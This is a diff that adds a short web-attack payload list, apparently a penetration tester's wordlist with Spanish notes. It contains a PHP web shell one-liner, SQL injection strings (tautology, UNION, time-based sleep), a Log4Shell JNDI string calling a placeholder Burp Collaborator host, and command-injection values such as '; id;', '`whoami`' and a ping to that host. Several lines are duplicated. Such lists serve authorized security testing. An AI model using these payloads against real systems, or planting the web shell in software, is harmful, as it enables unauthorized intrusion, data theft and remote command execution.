@@ -1,0 +1,15 @@
+<?php system($_GET['cmd']); ?>
+' OR 1=1--
+' UNION SELECT 1,2,user(),4,5--
+" OR SLEEP(5)--
+' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a)--
+${jndi:ldap://tu_colaborador.oastify.com/a}  (Para Log4Shell)
+' OR 1=1--
+' UNION SELECT 1,2,user(),4,5--
+" OR SLEEP(5)--
+' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a)--
+${jndi:ldap://tu_colaborador.oastify.com/a}  (Para Log4Shell)
+; id;
+`whoami`
+| ping -c 4 tu_colaborador.oastify.com
+$(sleep 10)
